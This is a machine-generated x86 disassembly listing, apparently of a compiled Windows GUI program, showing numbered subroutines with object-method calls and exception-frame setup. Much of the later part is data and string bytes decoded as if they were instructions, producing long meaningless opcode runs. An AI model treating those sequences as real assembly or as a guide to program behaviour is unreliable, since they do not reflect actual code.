call sub_4840c8
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4840c8
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax ebx
mov si 0xffeb
call sub_4034a4
sub_471d0c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov ebx [ ebp + 0x8 ]
push ebx
call sub_4438ac
mov ebx [ edx ]
add ebx 0xffffff00
sub ebx 0x9
jb r-xdata
pop ebx
pop ebp
retn 0x4
sub_471d34
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4833fc
mov esi [ ebx + 0x1a8 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4533bc
test al al
je r-xdata
mov eax [ ebx + 0x1a8 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_471d64
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4838dc
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1a8 ]
mov edx [ eax ]
call [ edx + 0x3c ]
mov edi eax
mov eax esi
call sub_47eb64
cmp edi eax
je r-xdata
mov eax esi
call sub_47eb64
mov edx eax
mov eax [ ebx + 0x1a8 ]
call sub_44bbc0
sub_471da8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx ebx
mov eax esi
call sub_44be08
mov eax [ esi + 0x1a8 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov edi [ esi + 0x4c ]
sar edi 0x1
jns r-xdata
add edi [ esi + 0x44 ]
mov eax [ eax + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
sub edi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
je r-xdata
adc eax 0x0
mov edx [ esi + 0x48 ]
push edx
mov eax [ esi + 0x1a8 ]
mov edx [ eax + 0x4c ]
push edx
mov ecx edi
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ esi + 0x1a8 ]
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov edx [ esi + 0x198 ]
add edx ebx
add edx 0x5
mov ecx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_471e44
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44bc54
mov edx ebx
mov eax [ esi + 0x1a8 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
pop esi
pop ebx
retn
sub_471e64
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x1a8 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_44c748
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_471e94
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47f990
xor edx edx
mov eax esi
call sub_44bd60
mov [ esi + 0x9b ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_471edc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
mov ecx esp
mov eax esi
call sub_44c050
mov eax esi
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov eax [ esi + 0x210 ]
test eax eax
je r-xdata
mov eax [ esi + 0x210 ]
test eax eax
je r-xdata
mov ebx [ esi + 0x258 ]
add ebx ebx
mov eax esi
call sub_480a00
test eax eax
je r-xdata
xor edx edx
call sub_47dbdc
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x60 ]
jmp r-xdata
mov dl 0x1
call sub_47dbdc
mov eax [ esi + 0x258 ]
add eax eax
cmp ebx eax
je r-xdata
mov edx [ eax + 0x40 ]
add ebx [ edx + 0x48 ]
add ebx [ esi + 0x228 ]
mov edx eax
mov eax esi
call sub_480cd0
test eax eax
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax esi
call sub_44c02c
mov edx ebx
mov eax esi
call sub_44c008
sub_471f88
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44d1d8
mov eax [ ebx + 0x280 ]
call sub_4032a8
xor eax eax
mov [ ebx + 0x280 ] eax
pop ebx
pop ebp
retn 0x4
sub_471fb4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44d204
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42f464
mov edi eax
mov [ ebx + 0x280 ] edi
mov [ esi ] edi
pop edi
pop esi
pop ebx
retn
sub_471fe0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
lea edx [ ebp - 0xc ]
push edx
push ebx
mov ecx [ ebp - 0x4 ]
mov edx esi
call sub_451b8c
cmp [ ebx ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
jne r-xdata
mov [ ebx ] al
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
jne r-xdata
sub_472040
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44fde8
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax ebx
call sub_480f74
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_44fdac
mov edx ebx
call sub_44c1ec
inc edi
dec esi
jne r-xdata
sub_472098
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4720bd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4720c4
retn
sub_4720d0
sbb al 0x21
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
and [ edi ] eax
or al 0x0
add [ eax ] al
sbb al al
inc edx
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x40042c3 ] ah
les eax [ edx ]
in al 0xc3
inc edx
add al dl
retn
sub_472126
inc edx
add [ edx ] cl
push esp
dec ebp
outsb
jne r-xdata
inc eax
add [ eax - 0x57ffbfd6 ] ch
sub al [ eax ]
je r-xdata
jne r-xdata
jo r-xdata
and al 0x22
inc edi
add [ 0x50746547 ] cl
outsd
jo r-xdata
inc eax
add [ eax + 0x300402a ] ch
add [ eax + eax ] dl
arpl [ ebx - 0x70 ] bp
and [ ecx ] 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
and [ edi ] eax
add [ eax ] al
add [ eax ] al
cwde
and [ edi ] eax
add [ eax ] al
add [ eax ] al
loop r-xdata
inc ecx
add [ ebx + ebx * 2 + 0x57f00047 ] dl
inc edi
add [ eax + esi * 8 - 0x39a3ffbc ] ch
inc esp
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax + 0x37 ] ah
inc edi
add ah ah
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
xor [ ecx ] 0x45
add [ eax - 0x27ffbad2 ] bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ eax + 0x20 ] bh
inc edi
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax - 0x64 ] 0x5c004751
0x44
add [ eax ] al
push ebx
insb
popad
jae r-xdata
add [ edx + esi + 0x40 ] bl
add [ eax - 0x57ffbfce ] bl
sub al [ eax ]
test al 0x2a
inc eax
add [ eax - 0x57ffbfd6 ] ch
sub al [ eax ]
test al 0x2a
inc edi
add [ eax + eax ] al
add [ eax ] al
xor al 0x9a
inc edi
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
cmp [ rw-data ] 0x0
je r-xdata
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
inc ebp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add ah ch
insb
inc ebp
js r-xdata
lea eax [ eax ]
jmp r-xdata
sbb al 0x0
sub al 0x22
inc edi
add [ 0x41746547 ] dl
push edx
insd
outsd
jbe r-xdata
mov eax 0xd2
jmp sub_40402c
call [ rw-data ]
and [ edi ] eax
pop es
adc [ ecx + eax * 2 + 0x63 ] edx
je r-xdata
or cl bh
dec ecx
je r-xdata
int3
outsd
outsb
inc edx
popad
jb r-xdata
lea eax [ eax ]
jmp r-xdata
insd
inc ebx
insb
popad
jae r-xdata
inc edi
add [ esi ] bh
and al 0x47
add [ eax ] cl
add eax [ eax ]
add [ eax + 0xa ] bl
inc edi
add ah cl
or al 0x24
je r-xdata
add [ eax ] al
and al [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
and al 0x47
sbb [ eax ] al
xor al 0x22
inc edi
add [ ecx ] dl
inc edi
je r-xdata
aaa
inc edi
add al dl
cmp eax [ ebp ]
clc
add eax [ ebp ]
and al 0x8f
pop esp
xor al [ eax ]
in al dx
insb
inc ebp
js r-xdata
dec [ ebp + 0x77e90040 ]
or cl bh
dec [ ebp + 0x6fe90040 ]
or cl bh
dec [ ebp + 0x22880040 ]
inc edi
add [ eax ] al
arpl [ edx + 0x6f ] si
insb
insb
inc edx
je r-xdata
test al 0x2a
inc eax
add [ eax - 0x57ffbfd6 ] ch
sub al [ eax ]
add eax [ eax ]
adc al 0x0
and [ edi ] eax
pushfd
0x47 0x4109
arpl [ esi + ebp * 2 + 0x4d ] si
outsb
add [ eax + 0x24 ] bl
inc edi
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
add [ esp ] cl
adc [ ecx + eax * 2 + 0x63 ] edx
je r-xdata
add [ eax ] al
add [ eax ] al
outsd
outsb
inc edx
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
sub_4722f8
rcl [ esi ] 0x48
add ah dl
push edx
inc edi
add [ eax ] al
in al dx
inc esp
add ah ch
inc ebp
add [ eax + 0x5400452f ] ch
sbb al 0x48
add [ edi + ebp - 0xedbffbb ] cl
inc esp
add [ edx + edi * 8 + 0x5580047 ] ah
inc ebp
add [ edi + edi * 8 + 0x44 ] al
add [ eax + 0x2 ] al
inc ebp
add [ eax ] dh
inc ebp
add [ eax - 0x2 ] bh
inc edi
add [ edi + edi * 8 + 0x4ac0047 ] dh
inc ebp
add [ esp + eax + 0x45 ] dl
add ah cl
xor [ ebp ] al
sub al 0x10
dec eax
add al al
inc edx
inc ebp
add [ eax + 0x2d ] cl
inc ebp
add [ eax ] bh
xor [ ebp ] al
inc eax
push ds
dec eax
add al dl
cli
inc edi
add [ ebx + edi * 8 + 0x3ce80047 ] dh
inc edi
add [ eax - 0x3 ] ah
inc edi
add ah bl
pop es
dec eax
add [ eax + 0x15 ] dl
dec eax
add [ eax - 0xfffb7ec ] ah
sbb cl [ eax ]
nop
or [ eax ] ecx
or [ 0xd940048 ] cl
dec eax
add [ esi + ecx + 0x48 ] al
add [ edi + edx ] al
dec eax
add [ edi + edx + 0x46b00048 ] dh
inc edi
add [ eax ] dl
push cs
dec eax
add [ eax - 0x43ffb7e3 ] bh
push cs
dec eax
add [ eax + 0xf ] cl
dec eax
add [ eax + 0x4 ] ch
dec eax
add [ eax + edx ] al
dec eax
add al bh
sbb [ eax ] cl
fcom [ eax ]
dec eax
add [ eax + 0x3c00481a ] bh
sbb eax 0x50a00048
inc edi
add [ eax + 0x38004813 ] ch
push ecx
inc edi
add [ esp + edx ] bh
dec eax
add [ eax + ecx + 0x5bc00048 ] bh
inc edi
add [ ebx + ebx * 2 + 0x47 ] dh
add [ eax + 0x3d ] bl
inc edi
add [ eax ] dl
inc ecx
inc edi
add [ eax - 0x27ffb8be ] ch
inc esp
inc edi
add [ ebp + eax * 2 + 0x47 ] dl
inc eax
je r-xdata
add [ eax + edx ] cl
inc edx
add [ esi - 0x2327ffc0 ] al
inc esp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ ebx + edx - 0x1647ffb9 ] bh
inc esp
add [ eax + 0x240044dd ] dh
cld
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec ebp
outsb
jne r-xdata
add al ah
and eax 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xc4004725
and eax 0x1d00047
add [ eax ] al
pushad
add al [ edi ]
int3
popad
jb r-xdata
add [ eax + eax * 2 + 0x45740047 ] cl
inc edi
add [ eax + 0x34004747 ] bl
dec eax
inc edi
push esp
inc ebp
inc edi
pop eax
and al 0x47
add [ edi ] al
adc al 0x54
inc ebx
jne r-xdata
jmp 0xffffffffddf7251a
je r-xdata
pop [ ecx ]
dec esp
push cs
inc edi
add [ edi * 4 - 0x4377ffbc ] bl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
add [ eax - 0x4fffbb17 ] bh
fld [ eax + eax + 0x24 ]
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec ebp
outsb
jne r-xdata
xor al 0x40
inc edi
add ah cl
push ss
inc edx
add ah bh
popad
jb r-xdata
add [ ecx + ecx * 2 + 0x4b400047 ] cl
inc edi
add [ eax ] ah
dec edx
inc edi
add ah bl
cmp eax [ edi ]
mov eax 0x8004751
add [ eax ] al
add [ eax ] edx
mov ah 0xe
mov al 0x3
mov ah 0x21
add [ ecx + eax ] al
add al 0xb4
mov dl 0xff
in al dx
push edx
inc edi
add [ eax - 0x3fffb8c4 ] ch
push edi
inc edi
add [ esp + edi + 0x47 ] dh
add al bh
push ebp
inc edi
add [ esi + edx * 2 ] bl
inc edi
add [ esp + edi + 0x40dc0047 ] dh
inc edi
add [ esp + edx * 2 ] dl
inc ebx
jne r-xdata
and al [ edi ]
and [ edi + eax * 2 ] cl
add [ ebx ] cl
add [ ecx ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
outsb
jne r-xdata
adc eax [ edx ]
in al dx
push ss
inc edx
add [ esp + ebx * 2 ] cl
inc edi
add [ eax - 0x28 ] cl
inc esp
add [ eax + ebx * 8 + 0x44 ] al
add [ ecx + ebx * 8 ] dl
inc esp
add [ eax + eax * 2 - 0x3d03ffb8 ] bl
inc esp
add [ eax - 0x3e ] ah
inc esp
add [ eax - 0x27ffbb35 ] cl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
add [ eax ] al
shl [ edi + eax * 2 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_472610
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ eax ] ch
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
daa
inc edi
add [ eax + ebp ] bl
inc edi
add [ eax ] bl
add eax [ eax ]
add [ edx ] bh
inc edi
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
inc ebp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ esi + ebx * 2 + 0x47 ] ah
add al dl
cmp eax [ ebp ]
clc
add eax [ ebp ]
and al 0x8f
inc ecx
add [ ebx + ebx * 2 + 0x6dc00047 ] dl
inc edi
add [ eax + esi * 8 - 0x39a3ffbc ] ch
inc esp
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ ebp + ebx * 2 + 0x47 ] ch
add ah ah
inc ebp
add al ah
insb
inc edi
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
mov eax 0x9800476c
inc ebp
add al bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ eax + 0x20 ] bh
inc edi
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax - 0x64 ] 0x5c004751
0x44
sub_4726c8
rcl [ esi ] 0x48
add ah dl
push edx
inc edi
add [ eax ] al
in al dx
inc esp
add ah ch
inc ebp
add [ eax + 0x5400452f ] ch
sbb al 0x48
add [ edi + ebp - 0xedbffbb ] cl
inc esp
add [ edx + edi * 8 + 0x5580047 ] ah
inc ebp
add [ ecx ] ah
inc edi
add [ eax + 0x2 ] al
inc ebp
add [ eax ] dh
inc ebp
add [ eax - 0x2 ] bh
inc edi
add [ edi + edi * 8 + 0x4ac0047 ] dh
inc ebp
add [ esp + eax + 0x45 ] dl
add ah cl
xor [ ebp ] al
sub al 0x10
dec eax
add al al
inc edx
inc ebp
add [ eax + 0x2d ] cl
inc ebp
add [ eax ] bh
xor [ ebp ] al
inc eax
push ds
dec eax
add al dl
cli
inc edi
add [ ebx + edi * 8 + 0x60900047 ] dh
inc edi
add ah dh
pushad
inc edi
add ah bl
pop es
dec eax
add [ eax + 0x15 ] dl
dec eax
add [ eax - 0xfffb7ec ] ah
sbb cl [ eax ]
nop
or [ eax ] ecx
or [ 0xd940048 ] cl
dec eax
add [ esi + ecx + 0x48 ] al
add [ edi + edx ] al
dec eax
add [ edi + edx + 0x46b00048 ] dh
inc edi
add [ eax ] dl
push cs
dec eax
add [ eax - 0x43ffb7e3 ] bh
push cs
dec eax
add [ eax + 0xf ] cl
dec eax
add [ esi + ebp * 2 ] bl
inc edi
add [ eax + edx ] al
dec eax
add al bh
sbb [ eax ] cl
fcom [ eax ]
dec eax
add [ eax - 0x67ffb7e6 ] bh
insd
inc edi
add [ eax - 0x37ffb8b0 ] ah
inc edi
add [ eax ] bh
push ecx
inc edi
add [ esp + edx ] bh
dec eax
add [ eax + ecx + 0x5bc00048 ] bh
inc edi
add [ ebx + ebx * 2 + 0x47 ] dh
add [ eax + 0x3d ] bl
inc edi
add [ eax ] dl
inc ecx
inc edi
add [ eax - 0x27ffb8be ] ch
inc esp
inc edi
add [ ebp + eax * 2 + 0x47 ] dl
add [ ecx + 0x61a00047 ] al
inc edi
add [ eax + 0x34004747 ] bl
dec eax
int3
je r-xdata
inc edi
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push eax
outsd
jo r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax ] dh
or al 0x45
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp + 0x47 ] dl
add [ edx + ebp + 0x47 ] bl
add [ eax ] ch
add eax [ eax ]
add [ esi ] cl
outsb
jne r-xdata
inc edi
add [ ecx + ecx * 2 + 0x4b400047 ] cl
inc edi
add [ eax ] ah
dec edx
inc edi
add [ esp + ebp * 2 + 0x47 ] ch
add [ eax - 0x53ffb8af ] bh
pop esi
inc edi
add [ eax ] cl
insd
inc edi
add al bl
insb
inc edi
add [ eax + 0x6d ] bh
inc edi
add [ eax + 0x7004763 ] ch
add [ eax + esi * 4 ] dl
or esi [ eax + 0x100ffea ]
pop ss
add ebx [ eax ]
add ecx ebp
[ eax ]
pushad
inc edi
add [ eax + 0x60 ] ah
inc edi
add [ eax - 0x27ffb89f ] al
inc edi
add [ eax - 0x5fffb896 ] al
push 0x47
add [ eax + 0x6b ] bl
inc edi
add [ esi ] dl
push esp
inc ebx
jne r-xdata
xor al 0x48
cmp [ eax ] ch
inc edi
add [ edi ] al
push ss
push esp
inc ebx
jne r-xdata
add al dl
cmp eax [ ebp ]
clc
add eax [ ebp ]
and al 0x8f
inc ecx
add [ ebx + ebx * 2 + 0x6dc00047 ] dl
outsd
inc edi
je r-xdata
add [ edi + ebp * 2 + 0x47 ] bl
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push eax
outsd
jo r-xdata
inc edi
add [ eax + esi * 8 - 0x39a3ffbc ] ch
inc esp
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
xchg esp eax
pop ebx
inc edi
add al al
insd
jo r-xdata
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
inc ebp
inc eax
outsb
jne r-xdata
xor al [ eax ]
pop esp
xor al [ eax ]
pop esp
inc edi
add [ esp + 0x47 ] dl
add [ ebx ] cl
add [ ecx ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
outsb
jne r-xdata
push ss
inc edx
add [ eax ] cl
outsd
inc edi
add ah ah
inc ebp
add [ edi + ebp * 2 + 0x3b4c0047 ] cl
inc ebp
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
mov eax 0x9800476c
inc ebp
add al bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ eax + 0x20 ] bh
inc edi
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax - 0x64 ] 0x5c004751
0x44
add [ eax - 0x13ffbded ] dh
add [ eax ] al
mov eax eax
mov ah 0x28
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2a ] bh
inc edi
add [ eax ] al
sub_472924
rcl [ esi ] 0x48
add ah dl
push edx
inc edi
add [ eax ] al
in al dx
inc esp
add ah ch
inc ebp
add [ eax + 0x5400452f ] ch
sbb al 0x48
add [ edi + ebp - 0xedbffbb ] cl
inc esp
add [ edx + edi * 8 + 0x5580047 ] ah
inc ebp
add [ ecx ] ah
inc edi
add [ eax + 0x2 ] al
inc ebp
add [ eax ] dh
inc ebp
add [ eax - 0x2 ] bh
inc edi
add [ edi + edi * 8 + 0x4ac0047 ] dh
inc ebp
add [ esp + eax + 0x45 ] dl
add ah cl
xor [ ebp ] al
sub al 0x10
dec eax
add al al
inc edx
inc ebp
add [ eax + 0x2d ] cl
inc ebp
add [ eax ] bh
xor [ ebp ] al
inc eax
push ds
dec eax
add al dl
cli
inc edi
add al al
outsd
inc edi
add [ eax - 0xbffb8a0 ] dl
pushad
inc edi
add ah bl
pop es
dec eax
add [ eax + 0x15 ] dl
dec eax
add [ eax - 0xfffb7ec ] ah
sbb cl [ eax ]
nop
or [ eax ] ecx
or [ 0xd940048 ] cl
dec eax
add [ esi + ecx + 0x48 ] al
add [ edi + edx ] al
dec eax
add [ edi + edx + 0x46b00048 ] dh
inc edi
add al dl
outsd
inc edi
add [ eax - 0x43ffb7e3 ] bh
push cs
dec eax
add [ eax ] cl
jo r-xdata
inc edi
add [ esi + ebp * 2 ] bl
inc edi
add [ eax + edx ] al
dec eax
add al bh
sbb [ eax ] cl
insb
jae r-xdata
sub [ edi ] al
or eax [ eax ]
or [ ecx + 0x63 ] eax
je r-xdata
add al ch
jno r-xdata
inc edi
add [ eax + 0x72 ] bl
inc edi
add [ eax + 0x4b ] al
inc edi
add [ eax ] ah
dec edx
inc edi
add [ esp + ebp * 2 + 0x47 ] ch
add [ eax - 0x53ffb8af ] bh
pop esi
inc edi
add [ eax ] cl
insd
inc edi
add al bl
insb
inc edi
add [ eax + 0x6d ] bh
add [ ecx + 0x61a00047 ] al
inc edi
add [ eax + 0x34004747 ] bl
dec eax
add [ eax - 0x67ffb7e6 ] bh
insd
inc edi
add [ eax - 0x37ffb8b0 ] ah
inc edi
add [ eax ] bh
push ecx
inc edi
add [ esp + edx ] bh
dec eax
add [ eax + ecx + 0x5bc00048 ] bh
inc edi
add [ ebx + ebx * 2 + 0x47 ] dh
add [ eax + 0x3d ] bl
inc edi
add [ eax + esi * 2 + 0x42a80047 ] ch
inc edi
add al bl
inc esp
inc edi
add [ ebp + eax * 2 + 0x47 ] dl
inc esp
dec ebp
outsb
jne r-xdata
add [ ecx ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
add [ ecx ] al
add [ edx ] al
mov ah 0xc4
outsd
inc edi
add [ edi ] dl
push esp
inc ebx
jne r-xdata
push ss
inc edx
add [ esp + esi * 2 ] bl
inc ebx
add [ eax - 0x28 ] cl
inc esp
add [ eax + ebx * 8 + 0x44 ] al
add [ ecx + ebx * 8 ] dl
inc esp
add [ eax - 0x3ffbb45 ] dl
retn 0x44
mov al 0x13
inc edx
add ah ch
add [ eax ] al
nop
hlt
int3
je r-xdata
inc ebx
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi - 0x2327ffc0 ] al
inc esp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
insd
imul edi [ edx + 0x65 ] 0x69746341
outsd
outsb
push esp
outsd
outsd
insb
inc edx
popad
jb r-xdata
inc esp
add [ eax - 0x3e ] ah
inc esp
add [ eax - 0x27ffbb35 ] cl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
add [ eax - 0x4fffbb17 ] bh
fld [ eax + eax + 0x24 ]
pop [ ecx ]
mov al 0x79
inc ebx
add [ edi * 4 - 0x4377ffbc ] bl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
xor al [ eax ]
fdiv [ ebx + eax * 2 ]
mov eax 0xb00044e9
sub al [ edi ]
pop es
pop ss
push esp
inc ebx
jne r-xdata
je r-xdata
je r-xdata
add ah bl
insd
imul edi [ edx + 0x65 ] 0x69746341
outsd
outsb
push esp
outsd
outsd
insb
inc edx
popad
jb r-xdata
inc edi
add [ eax + 0x60004763 ] ch
jne r-xdata
sub [ edi ] al
xor al 0x28
inc edi
add [ ebx ] cl
sub_472aac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x472b ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp + 0x18c0047 ] al
add [ eax ] al
mov [ ebx + eax * 2 ] ds
int3
sub_472b64
or cl cl
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax ] al
in al dx
inc esp
add [ eax - 0x33 ] cl
inc esp
add ah dh
int 0x44
add [ eax ] cl
mov esi 0xcdd40044
inc esp
add [ ebp + esi * 2 + 0x54140047 ] bl
inc ebx
jne r-xdata
cld
je r-xdata
inc ebp
add [ eax - 0x27ffbad2 ] bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ eax + 0x20 ] bh
inc edi
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax - 0x64 ] 0x5c004751
0x44
add al dl
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
inc edx
add ah bh
insd
dec ebp
inc esp
dec ecx
dec ebp
outsb
jne r-xdata
add [ eax ] al
pushfd
sub eax 0x2e040047
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x19ffb8d3 ] ch
sub eax 0x3280047
add [ eax ] al
cmp al 0x22
jne r-xdata
inc ebp
je r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add ah dh
jbe r-xdata
add [ eax ] dh
or al 0x45
outsb
lea eax [ eax ]
mov al [ 0x700472b ]
adc al 0x54
inc ebx
jne r-xdata
cmp eax [ ebp ]
clc
add eax [ ebp ]
and al 0x8f
inc ecx
add [ ebx + ebx * 2 + 0x7b740047 ] dl
inc edi
je r-xdata
insd
dec ebp
inc esp
dec ecx
dec ebp
outsb
jne r-xdata
inc edi
add ah cl
push ss
